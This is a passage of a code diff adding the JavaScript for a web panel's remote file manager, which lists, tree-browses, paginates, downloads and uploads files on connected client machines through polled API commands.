+            tr.addEventListener('dblclick', function() {
+                if (isDir) enterDirectoryByPath(itemPath);
+                else downloadFile(file.name);
+            });
+            const icon = isDir ? '📁' : '📄';
+            tr.innerHTML =
+                '<td class="name-cell">' + icon + ' ' + escapeHtml(file.name) + '</td>' +
+                '<td>' + escapeHtml(file.modified || '-') + '</td>' +
+                '<td><code class="small">' + fileModeStr(isDir) + '</code></td>' +
+                '<td>' + escapeHtml(isDir ? '—' : formatSize(file.size)) + '</td>' +
+                '<td>' + (isDir ? '—' : '<button type="button" class="btn btn-sm btn-outline-primary" onclick="downloadFile(' + JSON.stringify(file.name) + ')">下载</button>') + '</td>';
+            tbody.appendChild(tr);
+        });
+
+        document.getElementById('file-pagination').style.display = 'flex';
+        document.getElementById('file-pagination-total').textContent = '共 ' + total + ' 条数据';
+        document.getElementById('file-page-jump').value = String(fileListPage);
+        buildPageButtons(total, pages, fileListPage);
+    }
+
+    function buildPageButtons(total, pages, cur) {
+        const el = document.getElementById('file-pagination-btns');
+        el.innerHTML = '';
+        function addBtn(label, page, disabled) {
+            const b = document.createElement('button');
+            b.type = 'button';
+            b.className = 'btn btn-sm ' + (page === cur ? 'btn-primary' : 'btn-outline-secondary');
+            b.textContent = label;
+            b.disabled = !!disabled;
+            if (!disabled && page >= 1 && page <= pages) {
+                b.onclick = function() { fileListPage = page; renderPagedFiles(); };
+            }
+            el.appendChild(b);
+        }
+        addBtn('1', 1, cur === 1);
+        if (pages > 1) addBtn('‹', cur - 1, cur <= 1);
+        let start = Math.max(1, cur - 2);
+        let end = Math.min(pages, start + 4);
+        if (end - start < 4) start = Math.max(1, end - 4);
+        for (let p = start; p <= end; p++) {
+            if (p === 1 && start === 1) continue;
+            const lab = String(p);
+            const b = document.createElement('button');
+            b.type = 'button';
+            b.className = 'btn btn-sm ' + (p === cur ? 'btn-primary' : 'btn-outline-secondary');
+            b.textContent = lab;
+            b.onclick = function() { fileListPage = p; renderPagedFiles(); };
+            el.appendChild(b);
+        }
+        if (pages > 1) addBtn('›', cur + 1, cur >= pages);
+        if (pages > 1 && end < pages) {
+            const ell = document.createElement('span');
+            ell.textContent = '…';
+            ell.className = 'px-1';
+            el.appendChild(ell);
+            const b = document.createElement('button');
+            b.type = 'button';
+            b.className = 'btn btn-sm btn-outline-secondary';
+            b.textContent = String(pages);
+            b.onclick = function() { fileListPage = pages; renderPagedFiles(); };
+            el.appendChild(b);
+        }
+    }
+
+    document.getElementById('file-page-size').addEventListener('change', function() {
+        fileListPageSize = parseInt(this.value, 10) || 100;
+        fileListPage = 1;
+        if (allFilesList.length) renderPagedFiles();
+    });
+
+    function jumpToPageInput() {
+        const pages = Math.max(1, Math.ceil(allFilesList.length / fileListPageSize));
+        let n = parseInt(document.getElementById('file-page-jump').value, 10);
+        if (isNaN(n) || n < 1) n = 1;
+        if (n > pages) n = pages;
+        fileListPage = n;
+        renderPagedFiles();
+    }
+
+    function displayDirectoryTree(treeJson) {
+        const treeEl = document.getElementById('dir-tree');
+        treeEl.innerHTML = '';
+        try {
+            treeData = JSON.parse(treeJson) || [];
+        } catch (e) {
+            treeEl.textContent = '目录树解析失败';
+            return;
+        }
+        if (!Array.isArray(treeData) || treeData.length === 0) {
+            treeEl.textContent = '目录树为空';
+            return;
+        }
+        treeEl.appendChild(renderTreeNodes(treeData, 0));
+        applyTreeFilter();
+    }
+
+    function applyTreeFilter() {
+        const q = (document.getElementById('tree-filter').value || '').trim().toLowerCase();
+        document.querySelectorAll('#dir-tree li').forEach(function(li) {
+            if (!q) {
+                li.style.display = '';
+                return;
+            }
+            const t = (li.textContent || '').toLowerCase();
+            li.style.display = t.indexOf(q) >= 0 ? '' : 'none';
+        });
+    }
+
+    document.getElementById('tree-filter').addEventListener('input', function() {
+        applyTreeFilter();
+    });
+
+    function renderTreeNodes(nodes, level) {
+        const ul = document.createElement('ul');
+        ul.style.listStyle = 'none';
+        ul.style.paddingLeft = (level === 0 ? '0' : '14px');
+        ul.style.margin = '0';
+        sortTreeNodesForDisplay(nodes).forEach(node => {
+            const li = document.createElement('li');
+            li.style.marginBottom = '2px';
+            const isDir = !!(node.is_dir || node.type === 'directory');
+            const label = node.name || node.path || '(unknown)';
+
+            if (isDir) {
+                const details = document.createElement('details');
+                const summary = document.createElement('summary');
+                summary.style.cursor = 'pointer';
+                summary.textContent = '📁 ' + label;
+                summary.addEventListener('click', function() {
+                    enterDirectoryByPath(node.path || '.');
+                });
+                details.appendChild(summary);
+                details.dataset.path = node.path || '.';
+                details.dataset.loaded = 'false';
+                details.addEventListener('toggle', async function() {
+                    if (!details.open) return;
+                    if (details.dataset.loaded === 'true') return;
+                    const p = details.dataset.path || '.';
+                    const children = await fetchTreeChildren(p);
+                    details.dataset.loaded = 'true';
+                    if (!children || children.length === 0) return;
+                    details.appendChild(renderTreeNodes(children, level + 1));
+                    applyTreeFilter();
+                });
+                li.appendChild(details);
+            } else {
+                const row = document.createElement('div');
+                row.className = 'tree-file-leaf';
+                row.style.cursor = 'pointer';
+                row.style.userSelect = 'none';
+                row.textContent = '📄 ' + label;
+                row.title = '文件：点击在右侧打开所在目录';
+                row.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    const full = node.path || '';
+                    const parent = remoteParentPath(full);
+                    if (parent) enterDirectoryByPath(parent);
+                });
+                li.appendChild(row);
+            }
+            ul.appendChild(li);
+        });
+        return ul;
+    }
+
+    async function fetchTreeChildren(path) {
+        const key = String(path || '.');
+        if (treeChildrenCache[key]) return treeChildrenCache[key];
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/tree', {
+            method: 'POST',
+            body: JSON.stringify({ path: key, depth: 1 })
+        });
+        if (!data || !data.command_id) return [];
+        return new Promise(resolve => {
+            pollCommandResult(data.command_id, (result) => {
+                try {
+                    const children = JSON.parse(result) || [];
+                    treeChildrenCache[key] = children;
+                    resolve(children);
+                } catch (e) {
+                    resolve([]);
+                }
+            }, { errorTarget: 'silent', onGiveUp: () => resolve([]) });
+        });
+    }
+
+    function formatSize(bytes) {
+        if (bytes === undefined || bytes === null) return '-';
+        if (bytes === 0) return '0 B';
+        const k = 1024;
+        const sizes = ['B', 'KB', 'MB', 'GB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+    }
+
+    function enterDirectoryByPath(path) {
+        currentPath = path;
+        document.getElementById('current-path').value = currentPath;
+        listFiles(currentPath);
+    }
+
+    function goTreeRoot() {
+        treeChildrenCache = {};
+        document.getElementById('current-path').value = '';
+        currentPath = '';
+        showFileListPlaceholder();
+        loadDirectoryTree('.', 1);
+    }
+
+    function goUp() {
+        if (!currentPath || !String(currentPath).trim()) return;
+        const raw = String(currentPath).trim();
+        if (/^[a-zA-Z]:\\?$/i.test(raw.replace(/\//g, '\\'))) return;
+        if (raw === '/' || raw === '') return;
+
+        if (raw.indexOf('\\') >= 0 || /^[a-zA-Z]:/i.test(raw)) {
+            let p = raw.replace(/\//g, '\\').replace(/\\+$/, '');
+            const idx = p.lastIndexOf('\\');
+            if (idx <= 0) return;
+            if (idx === 2 && p[1] === ':') currentPath = p.slice(0, 3);
+            else currentPath = p.slice(0, idx);
+        } else {
+            let p = raw.replace(/\/+$/, '');
+            const idx = p.lastIndexOf('/');
+            if (idx < 0) return;
+            currentPath = idx === 0 ? '/' : p.slice(0, idx);
+        }
+        document.getElementById('current-path').value = currentPath;
+        listFiles(currentPath);
+    }
+
+    function changePath() {
+        const newPath = document.getElementById('current-path').value.trim();
+        if (newPath) {
+            currentPath = newPath;
+            listFiles(currentPath);
+        } else {
+            currentPath = '';
+            showFileListPlaceholder();
+        }
+    }
+
+    function refreshFiles() {
+        refreshAgentWorkingDir();
+        if (!currentPath || String(currentPath).trim() === '') {
+            showFileListPlaceholder();
+            return;
+        }
+        listFiles(currentPath);
+    }
+
+    /** 客户端 read_file 返回的是 Base64，需解码后再写入 Blob（否则保存的是乱码/ASCII） */
+    function base64ToUint8Array(b64) {
+        const s = String(b64 || '').replace(/\s/g, '');
+        if (!s) return new Uint8Array(0);
+        try {
+            const bin = atob(s);
+            const out = new Uint8Array(bin.length);
+            for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+            return out;
+        } catch (e) {
+            throw new Error('文件内容 Base64 解码失败');
+        }
+    }
+
+    async function downloadFile(filename) {
+        if (!currentPath || String(currentPath).trim() === '') {
+            alert('请先选择要浏览的目录。');
+            return;
+        }
+        const remotePath = joinRemotePath(currentPath, filename);
+        try {
+            const parts = [];
+            let offset = 0;
+            while (true) {
+                const resultB64 = await withExponentialBackoff(async function() {
+                    const data = await fetchJSON('/api/clients/' + clientId + '/files/download', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            remote_path: remotePath,
+                            offset: offset,
+                            length: TRANSFER_CHUNK_BYTES
+                        })
+                    });
+                    if (!data || !data.command_id) {
+                        throw new Error((data && data.error) ? String(data.error) : '请求失败');
+                    }
+                    return await pollCommandResultAsync(data.command_id, {
+                        maxAttempts: POLL_CHUNK_MAX_ATTEMPTS,
+                        intervalMs: POLL_CHUNK_INTERVAL_MS
+                    });
+                });
+                const chunk = base64ToUint8Array(resultB64);
+                if (chunk.length === 0) break;
+                parts.push(chunk);
+                offset += chunk.length;
+                if (chunk.length < TRANSFER_CHUNK_BYTES) break;
+            }
+            const blob = new Blob(parts, { type: 'application/octet-stream' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+        } catch (err) {
+            alert(err && err.message ? err.message : '下载失败');
+        }
+    }
+
+    function showError(msg) {
+        allFilesList = [];
+        const tbody = document.getElementById('file-list');
+        tbody.innerHTML = '<tr><td colspan="5" class="text-center text-danger">' + escapeHtml(msg) + '</td></tr>';
+        document.getElementById('file-pagination').style.display = 'none';
+    }
+
+    function showTreeError(msg) {
+        const treeEl = document.getElementById('dir-tree');
+        treeEl.innerHTML = '<div class="text-danger small">' + escapeHtml(msg) + '</div>' +
+            '<div class="text-muted small mt-2">可点击树上「↻」重试。</div>';
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        document.getElementById('current-path').value = '';
+        showFileListPlaceholder();
+        refreshAgentWorkingDir();
+        loadDirectoryTree('.', 1);
+
+        document.getElementById('upload-file-input').addEventListener('change', function(ev) {
+            const picked = Array.from(ev.target.files || []);
+            ev.target.value = '';
+            if (!picked.length) return;
+            for (let i = 0; i < picked.length; i++) {
+                const f = picked[i];
+                if (uploadQueue.length >= MAX_UPLOAD_FILES) {
+                    alert('最多只能同时添加 ' + MAX_UPLOAD_FILES + ' 个文件');
+                    break;
+                }
+                if (f.size > MAX_UPLOAD_BYTES) {
+                    alert('文件「' + f.name + '」超过 500MB，已跳过');
+                    continue;
+                }
+                uploadQueue.push({ id: ++uploadQueueSeq, file: f, status: 'pending' });
+            }
+            renderUploadQueue();
+        });
+
+        document.getElementById('modalMkdir').addEventListener('shown.bs.modal', function() {
+            document.getElementById('modal-mkdir-name').focus();
+        });
+        document.getElementById('modalNewFile').addEventListener('shown.bs.modal', function() {
+            document.getElementById('modal-newfile-name').focus();
+        });
+    });
+</script>
+</body>
+</html>
